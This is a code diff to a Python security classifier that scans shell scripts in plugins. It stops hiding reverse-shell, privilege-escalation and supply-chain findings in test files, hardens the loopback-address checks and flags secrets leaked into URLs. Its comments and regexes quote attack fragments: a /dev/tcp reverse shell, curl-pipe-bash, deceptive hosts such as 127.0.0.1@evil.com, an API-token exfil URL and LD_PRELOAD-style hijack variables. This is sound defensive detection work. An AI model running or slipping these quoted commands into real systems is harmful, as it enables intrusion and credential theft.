@@ -161,15 +161,28 @@ _SHELL_EXECUTION_CLASS_RULES: Final[frozenset[str]] = frozenset(
 
 _SHELL_COMMENT_LINE_RE: Final[re.Pattern[str]] = re.compile(r"^\s*#(?!!)")  # `#` but not `#!` shebang
 
+# Security-audit red-team (G5-skillaudit-shell-test-file-blanket, 2026-06-09)
+# — the content-threat EXECUTION rules REVERSE_SHELL, CONTAINER_ESCAPE,
+# PERSISTENCE, PRIVILEGE_ESC, and SUPPLY_CHAIN were REMOVED from this set,
+# mirroring the identical fix already shipped in the TS classifier
+# (``_TEST_FILE_BLANKET_SUPPRESS_RULES``). Each of those fires on a SPECIFIC
+# malicious payload — ``bash -i >& /dev/tcp/…`` (reverse shell),
+# ``docker run --privileged`` / a ``/proc/1/root`` mount (container escape),
+# a launchd/crontab install (persistence), ``sudo … NOPASSWD`` (priv-esc), a
+# ``curl … | bash`` supply-chain fetch — that is RARE in a legitimate test and
+# is EXECUTED at publish time (plugin test files run). Suppressing them by
+# filename alone (no content check) was a false negative: a reverse shell
+# parked in ``tests/test-foo.sh`` came back ``safe_literal`` (hidden). The
+# Python classifier already keeps these visible in ``test_evil.py``; shell now
+# matches. Per the project invariant, over-flagging a benign test is
+# acceptable; hiding an executed reverse shell is not.
 _SHELL_TEST_BLANKET_SUPPRESS_RULES: Final[frozenset[str]] = frozenset(
     {
         "CMD_INJECTION",
         "SHELL_EXEC",
         "TIME_BOMB",
         "RESOURCE_ABUSE",
-        "PERSISTENCE",
         "FS_WRITE",
-        "PRIVILEGE_ESC",
         "PATH_TRAVERSAL",
         "OBFUSCATION",
         "REGEX_DOS",
@@ -178,35 +191,36 @@ _SHELL_TEST_BLANKET_SUPPRESS_RULES: Final[frozenset[str]] = frozenset(
         "SSRF_ADVANCED",
         "URL_RAW_IP",
         "NET_SUSPICIOUS",
-        "SUPPLY_CHAIN",
-        "CONTAINER_ESCAPE",
         "ENV_INJECTION",
         "ENV_RECON",
         "CROSS_TOOL_ACCESS",
         "INSECURE_CRYPTO",
-        "REVERSE_SHELL",
         "URL_SUSPICIOUS",
     }
 )
 
 
 # r10-final FP iter (2026-05-28) — Shell test-file detection.
-_SHELL_TEST_FILE_PATTERNS: Final[tuple[str, ...]] = (
-    "/tests/",
-    "/test/",
-    "/__tests__/",
-    "/specs/",
-    "/spec/",
-    "test-",
-    "test_",
-    "/test.",
-    "_test.",
-    ".test.",
-    ".spec.",
-    "/fixtures/",
-    "/__fixtures__/",
-    "/mocks/",
-    "/__mocks__/",
+# Security-audit red-team (G5-skillaudit-shell-test-file-blanket, 2026-06-09):
+# split into a path-COMPONENT directory set and basename-anchored prefix/suffix
+# rules. The previous implementation matched these as raw SUBSTRINGS anywhere
+# in the path (``any(p in fp ...)``), so a REAL install script such as
+# ``plugins/latest-release/installer.sh`` matched ``test-`` inside
+# ``latest-release`` and had its execution-class findings hard-suppressed.
+# Mirrors the TS ``_is_test_file`` / Python ``_is_python_test_file`` predicates
+# (extension+location keyed, never substring).
+_SHELL_TEST_DIR_COMPONENTS: Final[frozenset[str]] = frozenset(
+    {
+        "tests",
+        "test",
+        "__tests__",
+        "specs",
+        "spec",
+        "fixtures",
+        "__fixtures__",
+        "mocks",
+        "__mocks__",
+    }
 )
 
 
@@ -231,12 +245,73 @@ _CLOUD_METADATA_RE_SHELL: Final[re.Pattern[str]] = re.compile(
     r"169\.254\.169\.254|metadata\.google|metadata\.azure|fd00:ec2::254",
     re.IGNORECASE,
 )
+# A loopback/private token is DECEPTIVE (NOT a genuine local host) when it is
+# immediately followed by ``@`` (URL userinfo — ``http://127.0.0.1@evil.com/``
+# connects to evil.com) or ``.<letter>`` (leftmost label of a longer public
+# domain — ``127.0.0.1.evil.com`` / ``localhost.attacker.net`` resolve via the
+# attacker's DNS). Mirror of the TS ``_DECEPTIVE_LOOPBACK_SUFFIX_RE``.
+_DECEPTIVE_LOOPBACK_SUFFIX_RE_SHELL: Final[re.Pattern[str]] = re.compile(r"@|\.[A-Za-z]")
+# A PUBLIC egress target on the line — a scheme URL whose host is NOT a
+# loopback/private/metadata token, or a bare public IPv4 literal. Its presence
+# means the line reaches the public internet, so a loopback token elsewhere on
+# the line is decorative (a comment / a separate local check) and MUST NOT
+# clear the public payload (destination-scoped, not line-scoped).
+_SCHEME_HOST_RE_SHELL: Final[re.Pattern[str]] = re.compile(r"https?://(?P<host>[A-Za-z0-9._\-]+)")
+_BARE_IPV4_RE_SHELL: Final[re.Pattern[str]] = re.compile(r"\b(?P<ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b")
+
+
+def _contains_deceptive_loopback_host_shell(text: str) -> bool:
+    """True iff ``text`` contains a loopback/private token that is actually a
+    DECEPTIVE host (userinfo before ``@``, or the leftmost label of a longer
+    public domain) — a real egress target disguised as loopback."""
+    for m in _LOOPBACK_PRIVATE_IP_RE_SHELL.finditer(text):
+        if _DECEPTIVE_LOOPBACK_SUFFIX_RE_SHELL.match(text, m.end()):
+            return True
+    return False
+
+
+def _line_has_public_egress_target_shell(line: str) -> bool:
+    """True iff ``line`` references a PUBLIC network destination — a scheme
+    URL (``https://host/…``) whose host is not loopback/private/metadata, or a
+    bare public IPv4 literal. Used to refuse the loopback suppression when the
+    real payload targets the public internet (the loopback token is then only
+    decorative)."""
+    for m in _SCHEME_HOST_RE_SHELL.finditer(line):
+        host = m.group("host")
+        # Cloud-metadata hosts are attacker-reachable → public.
+        if _CLOUD_METADATA_RE_SHELL.search(host):
+            return True
+        if not _LOOPBACK_PRIVATE_IP_RE_SHELL.fullmatch(host) and not _LOOPBACK_PRIVATE_IP_RE_SHELL.match(host):
+            # Host is not a loopback/private token → a public destination.
+            return True
+    for m in _BARE_IPV4_RE_SHELL.finditer(line):
+        ip = m.group("ip")
+        if _CLOUD_METADATA_RE_SHELL.search(ip):
+            return True
+        if not _LOOPBACK_PRIVATE_IP_RE_SHELL.match(ip):
+            return True
+    return False
 
 
 def _line_has_loopback_or_private_ip_shell(line: str) -> bool:
-    """True iff ``line`` contains a loopback / RFC1918 private /
-    link-local IP, EXCLUDING cloud-metadata endpoints."""
+    """True iff ``line``'s network DESTINATION is a loopback / RFC1918 private
+    / link-local host and NOTHING on the line reaches the public internet.
+
+    Hardened (security-audit red-team G5-skillaudit-shell-loopback-token-
+    suppress, 2026-06-09): the check is DESTINATION-scoped, not line-scoped. A
+    loopback token sitting in a comment / a separate local check on a line that
+    ALSO contains a public ``curl … | bash`` no longer clears the public
+    payload. Cloud-metadata endpoints and deceptive look-alike hosts
+    (``127.0.0.1@evil.com`` / ``localhost.attacker.net``) stay visible."""
     if _CLOUD_METADATA_RE_SHELL.search(line):
+        return False
+    # A deceptive look-alike host anywhere on the line is a real egress
+    # target disguised as loopback → keep visible.
+    if _contains_deceptive_loopback_host_shell(line):
+        return False
+    # A genuine public destination on the line means the loopback token is
+    # decorative → do NOT certify the line as loopback-only.
+    if _line_has_public_egress_target_shell(line):
         return False
     return bool(_LOOPBACK_PRIVATE_IP_RE_SHELL.search(line))
 
@@ -244,19 +319,35 @@ def _line_has_loopback_or_private_ip_shell(line: str) -> bool:
 def _is_shell_test_file(file_path: str) -> bool:
     """True iff ``file_path`` looks like a shell test or fixture script.
 
-    Patterns recognized:
-      - Path contains ``/tests/`` / ``/test/`` / ``__tests__/`` / etc.
-      - Basename starts with ``test-`` / ``test_`` (e.g. ``test-foo.sh``)
-      - Basename contains ``.test.`` / ``.spec.`` / ``_test.``
-      - Path contains ``/fixtures/`` / ``/mocks/``
+    Matching is extension+location keyed (mirrors ``_is_python_test_file`` /
+    the TS ``_is_test_file``), NEVER raw substring:
+      - A path COMPONENT (a full ``/``-delimited segment) is one of
+        ``tests`` / ``test`` / ``__tests__`` / ``specs`` / ``spec`` /
+        ``fixtures`` / ``__fixtures__`` / ``mocks`` / ``__mocks__``.
+      - The BASENAME starts with ``test-`` / ``test_`` (``test-foo.sh``).
+      - The BASENAME contains ``.test.`` / ``.spec.`` / ``_test.`` or ends
+        ``-test`` / ``_test`` before its extension.
 
-    Used to suppress TIME_BOMB / PERSISTENCE / RESOURCE_ABUSE in test
-    scaffolding (sleep, tmux/screen, etc.).
+    A directory like ``latest-release/`` or ``contest/`` no longer matches
+    (the old substring check matched ``test-`` / ``test`` inside them and
+    hard-suppressed real install scripts). Used to suppress
+    TIME_BOMB / RESOURCE_ABUSE / etc. in test scaffolding (sleep, tmux/screen).
     """
     fp = file_path.replace("\\", "/").lower()
     if not fp:
         return False
-    return any(p in fp for p in _SHELL_TEST_FILE_PATTERNS)
+    parts = fp.split("/")
+    if any(component in _SHELL_TEST_DIR_COMPONENTS for component in parts):
+        return True
+    basename = parts[-1]
+    if basename.startswith("test-") or basename.startswith("test_"):
+        return True
+    if ".test." in basename or ".spec." in basename or "_test." in basename:
+        return True
+    # Basename ending in ``-test`` / ``_test`` before the extension
+    # (``foo_test.sh`` → stem ``foo_test``).
+    stem = basename.rsplit(".", 1)[0]
+    return stem.endswith("-test") or stem.endswith("_test")
 
 
 def _is_shell_comment_line(line: str) -> bool:
@@ -298,6 +389,46 @@ def _is_launchagent_removal(line: str) -> bool:
     if _LAUNCHAGENT_INSTALL_RE.search(line):
         return False  # the line also installs / loads → keep visible
     return bool(_LAUNCHAGENT_REMOVE_RE.search(line))
+
+
+# Security-audit red-team (G5-skillaudit-shell-test-file-blanket, 2026-06-09)
+# — carve-outs that keep two specific shapes VISIBLE even inside a shell test
+# file (mirroring the TS classifier's ``_is_hijack_var_injection`` /
+# ``_line_has_exec_sink`` test-file carve-outs).
+#
+# (1) Runtime-hijack ENV var assignment. Assigning to LD_PRELOAD / NODE_OPTIONS
+#     / PYTHONSTARTUP / GIT_SSH_COMMAND / BASH_ENV / PATH / … injects attacker
+#     code into a legitimate process via a library/interpreter pre-load hook.
+#     Shell forms: ``export LD_PRELOAD=...`` and the inline-prefix
+#     ``LD_PRELOAD=/tmp/x.so cmd``. A test file IS executed at publish time, so
+#     a hijack-var injection there is still a real threat.
+_SHELL_HIJACK_VAR_INJECTION_RE: Final[re.Pattern[str]] = re.compile(
+    r"(?:^|[\s;&|(])(?:export\s+)?"
+    r"(?:LD_PRELOAD|LD_LIBRARY_PATH|DYLD_(?:INSERT_LIBRARIES|LIBRARY_PATH)|"
+    r"NODE_OPTIONS|PYTHONSTARTUP|PYTHONPATH|PERL5LIB|RUBYLIB|"
+    r"GIT_SSH_COMMAND|GIT_EDITOR|GIT_PROXY_COMMAND|"
+    r"CLASSPATH|JAVA_TOOL_OPTIONS|_JAVA_OPTIONS|BASH_ENV|ENV|PATH)"
+    r"\s*\+?="
+)
+# (2) A decode-then-exec OBFUSCATION shape: stdin/value reaches a real shell
+#     interpreter (``| bash`` / ``| sh`` / ``| python`` …) or an
+#     ``eval`` / ``source`` / ``bash -c`` wrapper. Reuses the in-module
+#     interpreter-pipe + exec-wrap recognisers, so a base64/xxd/charcode
+#     reconstruction piped into ``| sh`` in a test file stays visible.
+
+
+def _shell_line_is_hijack_var_injection(line: str) -> bool:
+    """True iff ``line`` assigns to a known runtime-hijack env var
+    (LD_PRELOAD / NODE_OPTIONS / GIT_SSH_COMMAND / BASH_ENV / PATH / …)."""
+    return bool(_SHELL_HIJACK_VAR_INJECTION_RE.search(line))
+
+
+def _shell_line_has_exec_sink(line: str) -> bool:
+    """True iff ``line`` routes data INTO a code-executing sink — a pipe to a
+    shell/script interpreter (``| bash`` / ``| sh`` / bare ``| python`` …) or
+    an ``eval`` / ``source`` / ``bash -c`` / ``<<<`` wrapper. Used to keep an
+    OBFUSCATION decode→exec shape visible inside a test file."""
+    return bool(_SHELL_INTERPRETER_PIPE_RE.search(line) or _CMDSUB_EXEC_WRAP_RE.search(line))
 
 
 # r08 sangrokjung FP iter1 (2026-05-28) — common shell command
@@ -486,6 +617,23 @@ def _line_has_exfil_sink(line: str) -> bool:
     return bool(_EXFIL_SINK_RE.search(line))
 
 
+def _line_leaks_secret_var_to_url(line: str) -> bool:
+    """True iff a secret-looking shell variable (``$API_TOKEN`` / ``${KEY}`` /
+    …) is interpolated into a URL query-parameter or a ``-d``/``--data`` POST
+    body on ``line`` — i.e. a credential is placed in an exfil position.
+
+    Reuses ``_SECRET_VAR_NAME_RE`` + ``_exfil_position_ref`` (the same pair the
+    issue-#59 live-sink discriminators use). Security-audit red-team
+    G5-skillaudit-curl-cmdsub-exfil (2026-06-09): a ``$(curl
+    "https://host/c?leak=$API_TOKEN")`` must NOT be certified a benign
+    data-fetch when it carries a secret off the machine."""
+    for vm in _VAR_REF_RE.finditer(line):
+        name = vm.group("name")
+        if _SECRET_VAR_NAME_RE.search(name) and _exfil_position_ref(line, name):
+            return True
+    return False
+
+
 def _cmdsub_is_safe_data_command(line: str, match: str) -> bool:
     """True iff a CMD_INJECTION ``$(...)`` match is a command substitution
     headed by a fixed data/query command whose result is neither piped to
@@ -506,9 +654,20 @@ def _cmdsub_is_safe_data_command(line: str, match: str) -> bool:
         return False
     if _SHELL_INTERPRETER_PIPE_RE.search(line):
         return False
+    # Security-audit red-team (G5-skillaudit-curl-cmdsub-exfil, 2026-06-09): a
+    # FETCH command (curl/wget/http) that places a secret-looking variable into
+    # a URL query / POST body is exfil, not a benign data read — keep visible.
+    # A secret-bearing var anywhere on a fetching line is enough to refuse the
+    # certification (the pure-data commands below never egress, so they are
+    # unaffected by this guard).
+    leaks_secret = _line_leaks_secret_var_to_url(line)
     for m in _CMDSUB_HEAD_RE.finditer(line):
         cmd = m.group("cmd")
-        if cmd in _SAFE_CMDSUB_DATA_COMMANDS or cmd in _NET_CAPTURE_CMDSUB_COMMANDS:
+        if cmd in _SAFE_CMDSUB_DATA_COMMANDS:
+            return True
+        if cmd in _NET_CAPTURE_CMDSUB_COMMANDS:
+            if leaks_secret:
+                return False  # credential leaves the machine → keep visible
             return True
     return False
 
@@ -1184,19 +1343,39 @@ def classify(
     # tmux, sleep, file writes, etc. for SUT setup. Iron rule preserved:
     # prose-vector rules (PROMPT_INJECT / DATA_EXFIL / INVISIBLE_UNICODE_RAW
     # / per-vendor SECRET_*) still fire.
+    #
+    # Security-audit red-team (G5-skillaudit-shell-test-file-blanket,
+    # 2026-06-09): REVERSE_SHELL / CONTAINER_ESCAPE / PERSISTENCE /
+    # PRIVILEGE_ESC / SUPPLY_CHAIN were removed from the blanket set (above),
+    # and two carve-outs keep specific payloads VISIBLE even inside a test
+    # file — an ENV_INJECTION hijack-var assignment (LD_PRELOAD / NODE_OPTIONS
+    # / …) and an OBFUSCATION decode→exec shape (… | bash / eval). Test files
+    # are EXECUTED at publish time, so those remain real threats.
     if _is_shell_test_file(file_path) and rule_id in _SHELL_TEST_BLANKET_SUPPRESS_RULES:
-        return "safe_literal"
+        if rule_id == "ENV_INJECTION" and _shell_line_is_hijack_var_injection(line_text):
+            pass  # hijack-var injection in a test file → keep visible
+        elif rule_id == "OBFUSCATION" and _shell_line_has_exec_sink(line_text):
+            pass  # decode→exec in a test file → keep visible
+        else:
+            return "safe_literal"
 
     # r10-final FP iter (2026-05-28) — NET_SUSPICIOUS / CMD_INJECTION
-    # / SUPPLY_CHAIN / URL_RAW_IP on loopback / RFC1918 private IP
+    # / URL_RAW_IP / SSRF_PATTERN on loopback / RFC1918 private IP
     # literals (127.0.0.1:9222 Chrome DevTools, 192.168.x.x home
     # network, etc.). Loopback / private IPs cannot reach the public
     # internet. Iron rule preserved: cloud metadata endpoint
     # 169.254.169.254 stays visible (attacker-reachable from cloud VMs).
+    #
+    # Security-audit red-team (G5-skillaudit-shell-loopback-token-suppress,
+    # 2026-06-09): SUPPLY_CHAIN was REMOVED from this set (the TS classifier
+    # already excludes it) — a ``curl … | bash`` supply-chain install is not
+    # rendered benign just because a loopback token appears on the same line.
+    # And ``_line_has_loopback_or_private_ip_shell`` is now DESTINATION-scoped
+    # (refuses to certify a line that also reaches a public host), so a
+    # loopback token in a comment beside a public payload no longer suppresses.
     if rule_id in (
         "NET_SUSPICIOUS",
         "CMD_INJECTION",
-        "SUPPLY_CHAIN",
         "URL_RAW_IP",
         "SSRF_PATTERN",
     ) and _line_has_loopback_or_private_ip_shell(line_text):
